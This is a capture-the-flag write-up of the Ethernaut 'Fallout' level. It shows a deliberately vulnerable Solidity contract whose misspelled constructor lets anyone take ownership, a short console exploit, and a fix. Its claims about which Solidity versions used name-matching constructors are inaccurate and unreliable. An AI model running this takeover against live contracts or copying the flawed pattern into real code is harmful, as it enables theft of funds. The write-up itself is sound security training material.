Ethernaut Level 2 — Fallout
Challenge: Claim ownership of the contract
Difficulty: Easy
Vulnerability Class: Unprotected Initializer / Constructor Typo
Status: ✅ Solved

Contract
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

Vulnerability
Root Cause — Constructor Typo
In Solidity ^0.6.0, constructors were defined by a function whose name exactly matched the contract name. If the names didn't match, the function was treated as a regular public function instead of a constructor.
In this contract:
Contract name"Constructor" nameFalloutFal1out
The letter l was replaced with the number 1 — a single character typo that turns a protected constructor into a public function anyone can call at any time.
Because Fal1out() was never called at deployment, the owner variable was never set — leaving it as address(0).

Impact
Critical — Anyone can call Fal1out() at any time and become the owner of the contract, gaining full control including:

Calling collectAllocations() to drain the entire contract balance
Any other onlyOwner privileged functions


Exploit
Executed directly from the Ethernaut browser console — no Remix or scripts needed:
javascript// Step 1 — call the fake constructor and claim ownership
await contract.Fal1out()

// Step 2 — verify we are now the owner
await contract.owner()
// Returns: '0x5cC46Bc3799c160245C45A0D3730911fa1d0F88b' ✅
Transaction Receipt
Instance address: 0xcA20a6bC9e344396eA56A547396f418C2f7ef51C
tx: 0xb882a37141330db2c5c122874446e269e03f22f65ad8612704a18ca48f645172

Real World Reference
This is not just a CTF exercise. The Rubixi hack (2016) exploited this exact vulnerability in production.
The developers renamed their contract from DynamicPyramid to Rubixi but forgot to rename the constructor function. The old DynamicPyramid() function remained public — anyone could call it and claim ownership of the live contract, draining real funds.

Fix
In Solidity ^0.8.0 this vulnerability is impossible — constructors now use the constructor keyword instead of matching the contract name:
diff- function Fal1out() public payable {
+ constructor() public payable {
      owner = msg.sender;
      allocations[owner] = msg.value;
  }
Additionally, locking the pragma to a fixed version prevents accidental deployment with an older compiler:
diff- pragma solidity ^0.6.0;
+ pragma solidity 0.8.18;

Lessons Learned

Always use the constructor keyword — never rely on function name matching (pre-0.8.0 pattern)
Typos in critical functions are critical vulnerabilities — a single character difference (l vs 1) gave full contract control to anyone
Code review must be paranoid — comments saying /* constructor */ do not make it a constructor
Lock your pragma — floating versions risk deploying with unexpected compiler behavior


Solved as part of the Ethernaut Web3 security wargame by OpenZeppelin.
Training via Cyfrin Updraft — Web3 Security Course.
